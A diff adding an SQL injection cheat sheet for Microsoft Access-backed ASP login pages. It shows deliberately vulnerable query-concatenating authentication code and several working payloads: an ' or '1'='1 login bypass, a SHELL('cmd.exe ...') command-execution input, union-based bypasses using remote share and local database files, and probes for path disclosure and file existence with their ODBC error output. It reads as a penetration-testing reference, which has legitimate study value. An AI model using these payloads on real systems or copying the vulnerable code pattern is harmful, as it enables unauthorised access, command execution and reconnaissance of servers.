@@ -1,0 +1,153 @@
+================================================== ==========================
+% Access SQL Injection
+% brett.moore_at_security-assessment.com
+================================================== ==========================
+
+Nothing new here, move along..
+
+************************************************** **************************
+% MS Access system tables
+************************************************** **************************
+MSysACEs
+MSysObjects
+MSysQueries
+MSysRelationships
+
+************************************************** **************************
+% MS Access command execution, (older versions only)
+************************************************** **************************
+[Auth Page Script]
+
+user = request("user")
+pass = request("pass")
+Set Conn = Server.CreateObject("ADODB.Connection")
+Set Rs = Server.CreateObject("ADODB.Recordset")
+Conn.Open dsn
+SQL = "SELECT * FROM users where pass='"& pass &"' and user='"& user & "'"
+rs.open sql,conn
+if rs.eof and rs.bof then
+' Access Denied
+else
+' Access Allowed
+end if
+
+[Auth Page Bypass]
+
+user = |SHELL("cmd.exe /c dir > c:\test.txt")|
+pass = test
+
+************************************************** **************************
+% Auth Bypass, Basic
+************************************************** **************************
+[Auth Page Script]
+
+user = request("user")
+pass = request("pass")
+Set Conn = Server.CreateObject("ADODB.Connection")
+Set Rs = Server.CreateObject("ADODB.Recordset")
+Conn.Open dsn
+SQL = "SELECT * FROM users where pass='"& pass &"' and user='"& user & "'"
+rs.open sql,conn
+if rs.eof and rs.bof then
+' Access Denied
+else
+' Access Allowed
+end if
+
+[Auth Page Bypass]
+
+user = ' or '1'='1
+pass = test
+
+************************************************** **************************
+% Auth Bypass, Simple
+************************************************** **************************
+[Auth Page Script]
+
+user = request("user")
+pass = request("pass")
+Set Conn = Server.CreateObject("ADODB.Connection")
+Set Rs = Server.CreateObject("ADODB.Recordset")
+Conn.Open dsn
+SQL = "SELECT user,pass FROM users where user='"& user & "'"
+rs.open sql,conn
+if rs.eof and rs.bof then
+' Access Denied
+else
+if (rs("pass") = pass) then
+' Access Allowed
+else
+' Access Denied
+end if
+end if
+
+[Auth Page Bypass Using Shares]
+
+user = ' union select name,password from table1 in '\\share\test\test.mdb
+pass = password that is set in \\share\test\test.mdb
+
+[Auth Page Bypass Local mdbs]
+
+user = ' union select '0test','0test' from customers in
+'C:\winnt\Help\iisHelp\iis\htm\tutorial\eecustmr.m db'
+pass = 0test
+
+[Union Notes]
+
+Remeber when using unions the sort order can affect the first record
+returned.
+
+************************************************** **************************
+% System Path Disclosure
+************************************************** **************************
+[Sql String]
+user = test' union select names from msysobjects in '.
+
+[ODBC Response]
+
+Microsoft OLE DB Provider for ODBC Drivers (0x80004005)
+[Microsoft][ODBC Microsoft Access Driver] The Microsoft Jet database engine
+cannot
+open the file 'C:\WINNT\system32'. It is already opened exclusively by
+another user,
+or you need permission to view its data.
+
+************************************************** **************************
+% Verify File Exists
+************************************************** **************************
+[Sql String - non-existant file]
+user = test' union select name from msysobjects in '\proof
+
+[ODBC Response]
+Microsoft OLE DB Provider for ODBC Drivers (0x80004005)
+[Microsoft][ODBC Microsoft Access Driver] Could not find file 'C:\proof'.
+
+[Sql String - existant]
+user = test' union select name from msysobjects in '\proof.txt
+
+[ODBC Response]
+Microsoft OLE DB Provider for ODBC Drivers (0x80004005)
+[Microsoft][ODBC Microsoft Access Driver] Unrecognized database format
+'C:\proof.txt'.
+
+************************************************** **************************
+% Verify Path Exists
+************************************************** **************************
+[Sql String - non-existant path]
+test' union select name from msysobjects in '\nopath\sqlerr
+
+[ODBC Response]
+Microsoft OLE DB Provider for ODBC Drivers (0x80004005)
+[Microsoft][ODBC Microsoft Access Driver] 'C:\nopath\sqlerr' is not a valid
+path.
+Make sure that the path name is spelled correctly and that you are
+connected to the
+server on which the file resides.
+
+[Sql String - existant path]
+user = test' union select name from msysobjects in '\inetpub\sqlerr
+
+[ODBC Response]
+Microsoft OLE DB Provider for ODBC Drivers (0x80004005)
+[Microsoft][ODBC Microsoft Access Driver] Could not find file
+'C:\inetpub\sqlerr'.
